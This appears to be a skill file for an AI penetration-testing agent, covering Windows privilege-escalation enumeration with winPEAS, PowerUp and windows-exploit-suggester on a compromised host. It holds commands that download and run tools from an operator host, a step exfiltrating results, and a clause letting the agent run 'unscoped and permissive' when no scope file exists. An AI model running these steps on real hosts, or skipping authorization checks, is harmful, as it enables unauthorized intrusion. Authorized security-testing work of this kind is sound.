---
name: privesc-windows
description: "Windows privilege-escalation path enumeration on a compromised host: winpeas surface enumeration, PowerUp.ps1 service / token / registry checks, windows-exploit-suggester kernel CVE matching. Surfaces ranked paths to operator/agent; does not autonomously exploit them."
version: 0.1.0
license: Apache-2.0
author: Scarlight contributors
platforms: [linux, macos]
prerequisites:
  commands: [powershell.exe, cmd.exe]
metadata:
  scarlight:
    tags: [privesc, post-exploitation, windows, winpeas, powerup, offensive]
    phase: post-exploitation
    related_skills: [service-exploit, credential-harvest, password-attack]
    risk_level: active
---

# Privesc-windows — Windows privilege-escalation enumeration

Given an initial shell on a compromised Windows host (typically a non-elevated user — IIS app-pool, service account, low-priv domain user), enumerate the local environment for privilege-escalation paths. Wraps `winpeas`, `PowerUp.ps1`, and `windows-exploit-suggester`. Surfaces ranked paths; does NOT autonomously exploit them.

This skill is **`active`** — see [`CONVENTIONS.md`](../CONVENTIONS.md) §1. It generates target-side activity (registry reads, service-config queries, file enumeration) that Windows event logs / EDR will record. Does NOT clear logs, does NOT bypass EDR ([`specs/exploitation-v1/requirements.md`](../../specs/exploitation-v1/requirements.md) §6).

## When to use

- [`service-exploit`](../service-exploit/SKILL.md) (or web-shell upload via [`web-exploit`](../web-exploit/SKILL.md)) produced a non-administrator Windows shell.
- The engagement's goals require SYSTEM / admin / domain-admin (read SAM, dump lsass, lateral movement, root.txt).
- Initial environment captured: `whoami /all`, `systeminfo`, `net user`, `net localgroup administrators`.

If the shell is already SYSTEM, this skill has no work; go to [`credential-harvest`](../credential-harvest/SKILL.md).

## Hard prerequisite — authorization

Refer to [`CODE_OF_USE.md`](../../CODE_OF_USE.md) — Scarlight is for authorized engagements only. The engagement-scope guard is a first measure, not a substitute for the operator's legal responsibility. Engagements are **opt-in**: when an `engagement.yaml` is active its `targets:` list is enforced (and re-checked at skill entry as defense in depth); when **none** is declared the session runs **unscoped and permissive** — proceed with the task, do not demand a scope file or refuse for lack of one, and treat the operator as responsible under the policy above.

- Target host MUST be in `engagement.yaml`'s `targets:` list. Re-check at skill entry ([`CONVENTIONS.md`](../CONVENTIONS.md) §2). A compromise won via [`service-exploit`](../service-exploit/SKILL.md) does not extend scope.
- This skill runs **inside the compromised-host shell**, not the Kali sandbox — documented sandbox exception ([`CONVENTIONS.md`](../CONVENTIONS.md) §6).
- Windows Defender / EDR will flag `winpeas.exe` and `PowerUp.ps1` reliably. If the engagement-owner has provisioned a target where Defender is left enabled, the skill body's `winpeas` invocation will likely be quarantined. That's *the operator's signal*, not a failure mode to "evade around."

## Procedure

`$WORK="$env:TEMP\privesc-windows-$(Get-Date -UFormat %s)"` (PowerShell) or `%TEMP%\privesc-windows-...` (cmd). Use `%TEMP%` not the user profile — `%TEMP%` is expected churn; the user profile is a durable artifact.

```powershell
$WORK = "$env:TEMP\privesc-windows-$(Get-Date -UFormat %s)"
New-Item -ItemType Directory -Force -Path $WORK | Out-Null
Set-Location $WORK
```

### 1. Environment baseline

```cmd
whoami /all              > whoami.txt
whoami /priv            >> whoami.txt
systeminfo               > systeminfo.txt
net user                 > users.txt
net localgroup administrators > admins.txt
net session 2>nul        > sessions.txt
hostname                 > hostname.txt
ipconfig /all            > ipconfig.txt
route print              > routes.txt
arp -a                   > arp.txt
tasklist /svc            > tasklist.txt
sc query state= all      > services.txt
```

PowerShell equivalent (when only PowerShell is available):

```powershell
whoami /all | Out-File whoami.txt
Get-LocalUser | Out-File users.txt
Get-LocalGroupMember -Group "Administrators" | Out-File admins.txt
Get-CimInstance Win32_OperatingSystem | Out-File systeminfo.txt
Get-CimInstance Win32_Service | Where-Object { $_.State -eq "Running" } | Out-File services.txt
```

Key signals from baseline:
- `whoami /priv` — token privileges. `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege` are all individually escalation paths.
- `net localgroup administrators` — am I already in Administrators (but token-stripped via UAC)?
- `systeminfo` — OS build, patch level → `windows-exploit-suggester` input.
- Running services with auto-start + writable binary paths.

### 2. `winpeas`

Stage `winpeas.exe` (preferred; faster, more checks) or `winpeas.ps1`. Same operator-hosted-fileserver pattern as `privesc-linux` — do NOT curl from `github.com` from the target.

```powershell
# winpeas.exe variant
$wpUrl = "http://$env:OPERATOR_HOST:$env:OPERATOR_PORT/winPEASx64.exe"
Invoke-WebRequest -Uri $wpUrl -OutFile "$WORK\wp.exe" -UseBasicParsing
& "$WORK\wp.exe" --no-color > "$WORK\winpeas.txt" 2>&1
Remove-Item "$WORK\wp.exe" -Force
```

```powershell
# winpeas.ps1 variant (when AMSI doesn't trigger; .ps1 is usually flagged)
$wpUrl = "http://$env:OPERATOR_HOST:$env:OPERATOR_PORT/winPEAS.ps1"
$content = (Invoke-WebRequest -Uri $wpUrl -UseBasicParsing).Content
Set-Content -Path "$WORK\wp.ps1" -Value $content
powershell.exe -ExecutionPolicy Bypass -NoProfile -File "$WORK\wp.ps1" > "$WORK\winpeas.txt" 2>&1
Remove-Item "$WORK\wp.ps1" -Force
```

Flags ([`CONVENTIONS.md`](../CONVENTIONS.md) §4):
- `--no-color` — winpeas's ANSI sequences mangle output redirected to file. Parseable form only.
- No `-f` (full-mode) flag — over-aggressive enumeration generates events Defender correlates as scanning behavior.

### 3. `PowerUp.ps1` — service / token / registry abuse

```powershell
$puUrl = "http://$env:OPERATOR_HOST:$env:OPERATOR_PORT/PowerUp.ps1"
$content = (Invoke-WebRequest -Uri $puUrl -UseBasicParsing).Content
Set-Content -Path "$WORK\PowerUp.ps1" -Value $content
powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "
  . '$WORK\PowerUp.ps1'
  Invoke-AllChecks | Out-File '$WORK\powerup.txt'
"
Remove-Item "$WORK\PowerUp.ps1" -Force
```

PowerUp's `Invoke-AllChecks` covers:
- Unquoted service paths (`Get-UnquotedService`)
- Modifiable services (`Get-ModifiableService`)
- Modifiable service binaries (`Get-ModifiableServiceFile`)
- DLL-hijack opportunities (`Find-ProcessDLLHijack`)
- Registry AlwaysInstallElevated (`Get-RegistryAlwaysInstallElevated`)
- Autorun-on-login registry entries (`Get-RegistryAutoLogon`)
- Unattended-install file passwords (`Get-UnattendedInstallFile`)

`Invoke-AllChecks` is read-only by default. NEVER run the matching `Write-*` / `Invoke-Service*` helpers from this skill body — those weaponize the finding, which is operator-decision territory.

### 4. Kernel CVE candidates — `windows-exploit-suggester`

`windows-exploit-suggester.py` runs on the operator's host (Python tool), consuming `systeminfo.txt` output:

```bash
# On operator side (Kali sandbox):
python3 /opt/windows-exploit-suggester/wes.py --update
python3 /opt/windows-exploit-suggester/wes.py \
  -i "/path/to/target/systeminfo.txt" \
  -d /opt/windows-exploit-suggester/wes-db.xml \
  > "$WORK/wes.txt"
```

(The target side just produced `systeminfo.txt`; `wes` consumes it offline. Keeps the noisy "what patches am I missing" enumeration on the operator's side.)

Parse for entries where `Severity == Important` or `Critical`, `Type == elevation of privilege` or `remote code execution`, and `Patch published date < target's last-patched date`.

### 5. Token-impersonation specifics

If `whoami /priv` shows `SeImpersonatePrivilege` enabled, the classic path is "Potato"-family abuse (JuicyPotatoNG / RoguePotato / PrintSpoofer). The skill body surfaces this as a finding; it does **not** stage the binary. The Potato variants are explicit weaponization — operator decision.

```powershell
# Detection only — what privileges enable which families
if ($whoami_priv -match "SeImpersonatePrivilege.*Enabled") {
  "FINDING: SeImpersonatePrivilege enabled — JuicyPotatoNG / PrintSpoofer applicable" | Out-File -Append findings.txt
}
if ($whoami_priv -match "SeBackupPrivilege.*Enabled") {
  "FINDING: SeBackupPrivilege enabled — SAM/SYSTEM hive read possible" | Out-File -Append findings.txt
}
if ($whoami_priv -match "SeAssignPrimaryTokenPrivilege.*Enabled") {
  "FINDING: SeAssignPrimaryTokenPrivilege enabled — token-stealing techniques applicable" | Out-File -Append findings.txt
}
```

### 6. Rank and surface

Aggregate into `ranked.md`, same shape as `privesc-linux`:

```
## High-confidence
- AlwaysInstallElevated registry (instant SYSTEM via MSI)
- Modifiable service binary (with auto-start)
- SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege enabled
- Unquoted service path with writable parent dir
- Unattended-install file with cleartext password

## Medium-confidence
- DLL-hijack opportunity on a high-priv process
- Modifiable scheduled task action
- Stored credentials via cmdkey / Vault
- Highly-rated kernel CVE from wes

## Lower-confidence
- World-writable files in Program Files
- LAPS misconfig (rare; usually needs admin to read)
```

### 7. Cleanup

```powershell
# winpeas / PowerUp staged binaries already removed inline above.
# $WORK directory contains only operator-readable text reports.
Get-ChildItem "$WORK" -File | Where-Object { $_.Extension -in '.exe', '.ps1', '.dll' } |
  ForEach-Object {
    Write-Warning "tool binary still present: $($_.FullName)"
    Remove-Item $_.FullName -Force
  }
```

Then exfiltrate `$WORK` to the operator host.

### 8. Audit logging

```bash
audit_log "privesc-windows" "$TARGET_HOSTNAME" "winpeas --no-color; PowerUp Invoke-AllChecks; wes (offline)" "success"
```

The audit log is on the operator's host.

## Output — what to record

Update the `privesc` subtree of the memory record ([`CONVENTIONS.md`](../CONVENTIONS.md) §7):

```json
{
  "privesc": {
    "host": "...",
    "os_build": "Windows Server 2019 17763",
    "current_user": "iis-apppool\\webapp",
    "current_token_privs": ["SeImpersonatePrivilege:enabled", "..."],
    "paths": [
      {"vector": "AlwaysInstallElevated", "rank": "high", "evidence": "HKLM\\...\\AlwaysInstallElevated=1 AND HKCU\\...=1"},
      {"vector": "SeImpersonatePrivilege:JuicyPotatoNG", "rank": "high", "evidence": "whoami /priv"},
      {"vector": "Modifiable service binary: VulnService -> C:\\Programs\\vs.exe (writable)", "rank": "high", "evidence": "PowerUp.Get-ModifiableServiceFile"}
    ]
  }
}
```

## Hand-off

| Vector class | Next step |
|---|---|
| SAM / SYSTEM hive readable (SeBackup) | [`credential-harvest`](../credential-harvest/SKILL.md) → [`password-attack`](../password-attack/SKILL.md) |
| Token-impersonation (Se*) → SYSTEM | operator-driven Potato-family binary deploy (NOT this skill); then [`credential-harvest`](../credential-harvest/SKILL.md) for lsass dump |
| Kernel CVE with public exploit | [`service-exploit`](../service-exploit/SKILL.md) (handles standalone exploit pattern) |
| AlwaysInstallElevated / modifiable service | operator-driven MSI deploy or service-binary replace (one command per finding, operator-authorized) |
| Domain-context findings (saved creds for domain account) | `lateral-movement` (v1.2 — deferred) |

## What this skill is NOT for

- **Automatic exploit execution** — surfaces paths only. Potato-family binaries, MSI deployment, service-binary replacement are operator decisions. This is the "rank > exploit" line from `specs/exploitation-v1/requirements.md` §3.2.
- **UAC-bypass techniques that touch persistence** — fodhelper-style registry persistence is out. UAC-bypass-for-elevation-only (one-shot) is operator decision; persistence is a separate (v1.2+) concern.
- **Windows EDR evasion** — explicit `specs/exploitation-v1/requirements.md` §6 deferral. If Defender quarantines `winpeas.exe`, surface that — do NOT respond by AMSI-bypassing or running an obfuscated variant.
- **Active Directory exploitation** — explicit Tier 3 deferral (`specs/exploitation-v1/requirements.md` §7). BloodHound / kerberoast / AS-REP / NTLM relay are v1.2.
- **Persistence installation** — no `Run` key writes, no scheduled task creation, no service-replacement-for-persistence. Cleanup at end is hygiene.
- **Log clearing / event-log deletion** — out of scope, indefinitely.
- **Autonomous 0-day weaponization** — `specs/mission.md` non-goal.
- **OT / ICS / medical-device hosts** — `specs/mission.md` non-goal. Refuse.
- **Targets not in the active engagement scope** — refuse, don't run.
